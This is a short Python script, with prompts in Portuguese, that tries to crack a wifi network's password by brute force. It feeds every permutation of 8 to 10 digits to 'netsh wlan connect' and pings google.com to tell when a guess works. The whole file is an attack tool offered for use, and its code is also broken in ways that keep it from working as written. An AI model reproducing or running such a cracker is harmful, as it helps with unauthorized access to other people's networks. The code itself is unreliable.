from subprocess import Popen, STDOUT, PIPE, call
from time import sleep
from itertools import permutations

nome = input("Digite o nome da rede wifi: ")

def testar(senha):
    manipulador = Popen('netsh wlan connect {}'.format(nome), shell=False, stdout=PIPE, stderr=STDOUT, stdin=PIPE)
    manipulador.stdin.write(senha)
    while manipulador.poll() == None:
        print(manipulador.stdout.readline().strip())
    if call('ping -n 1 www.google.com') == 0:
        print('Conectado')
        print('Esta é a senha: {}'.format(senha))
        exit()
    else:
        print('{} não é a senha'.format(senha))
        
caracteres = '0123456789'
for x in range(8, len(caracteres) + 1):
    for y in permutations(caracteres, x):
        testar(str(y).encode('utf-8'))  
    